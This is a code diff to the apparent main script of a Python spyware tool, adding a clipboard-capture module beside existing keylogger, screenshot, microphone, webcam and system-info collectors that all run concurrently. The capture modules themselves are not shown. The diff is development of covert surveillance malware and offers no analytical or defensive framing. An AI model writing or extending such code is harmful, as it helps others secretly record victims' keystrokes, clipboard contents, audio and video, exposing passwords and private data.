@@ -7,6 +7,7 @@ from src.system_info import SysInfo
 from src.screenshots import Screenshots
 from src.microphone import Microphone
 from src.webcamera import WebCamera
+from src.clipboard import Clipboard
 
 from src.make_dir import run
 
@@ -33,6 +34,10 @@ def web_camera():
     w = WebCamera()
     w.run()
 
+def clipboard():
+    cb = Clipboard()
+    cb.run()
+
 
 if __name__ == "__main__":
     with concurrent.futures.ThreadPoolExecutor() as executor:
@@ -41,4 +46,5 @@ if __name__ == "__main__":
         executor.submit(screenshot)
         executor.submit(system_info)
         executor.submit(keylogger)
+        executor.submit(clipboard)
         executor.submit(web_camera)
